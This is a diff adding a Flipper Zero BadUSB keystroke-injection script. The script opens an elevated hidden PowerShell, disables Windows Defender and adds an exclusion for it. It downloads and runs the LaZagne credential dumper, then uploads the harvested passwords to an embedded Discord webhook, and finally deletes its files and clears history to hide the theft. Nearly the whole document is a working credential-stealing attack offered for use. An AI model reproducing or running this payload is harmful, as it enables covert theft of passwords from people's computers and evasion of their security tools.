@@ -1,0 +1,73 @@
+REM Open PowerShell as Admin
+DEFAULT_DELAY 300
+DELAY 1000
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 1000
+
+REM Hide Powershell (Remember to extract Flipper only when it displays 100%)
+STRING PowerShell.exe -WindowStyle hidden
+ENTER
+
+REM Disable real-time protection
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+
+REM Create a tmp directory in Downloads folder if it doesn't exist
+STRING $dir = "C:\Users\$env:UserName\Downloads\tmp"
+ENTER
+STRING if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }
+ENTER
+
+REM Add an exception to Windows Defender for the tmp directory
+STRING Add-MpPreference -ExclusionPath $dir
+ENTER
+
+REM Hide the directory (use a different approach)
+STRING attrib +h +s $dir
+ENTER
+
+REM Download the executable (version 2.4.5 is the latest in this example)
+STRING Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/lazagne.exe" -OutFile "$dir\lazagne.exe"
+ENTER
+DELAY 2000  ; Added delay to allow time for the download to complete
+
+REM Execute lazagne.exe and save output to a file
+STRING & "$dir\lazagne.exe" all > "$dir\output.txt"
+ENTER
+
+REM Define Discord webhook URL
+STRING $dc = "https://discordapp.com/api/webhooks/1207911611650547732/XlR8PqioDTgKoWdNsFc9sOYD9xZhs6_cmT9xH3ZRdt3CgDsHJVw3lQMaxqsX9J4KWetv"
+ENTER
+
+REM Download Discord-Upload.ps1 from GitHub
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/QuackBeans/flipper/main/Discord-Upload.ps1" -OutFile "$dir\Discord-Upload.ps1"
+ENTER
+DELAY 3000  ; Added delay to allow time for the download to complete
+
+REM Import the function from Discord-Upload.ps1
+STRING . "$dir\Discord-Upload.ps1"
+ENTER
+
+REM Use the function to upload output.txt to Discord
+STRING Discord-Upload -hookurl "$dc" -file "$dir\output.txt" -text "txt" -file "$dir\output.txt"
+
+ENTER
+
+REM Permanently delete the tmp folder
+STRING Remove-Item -Path "$dir" -Recurse -Force
+ENTER
+
+REM Clear PowerShell history
+STRING Clear-History
+ENTER
+
+REM Close PowerShell
+STRING Exit
+ENTER
+
+
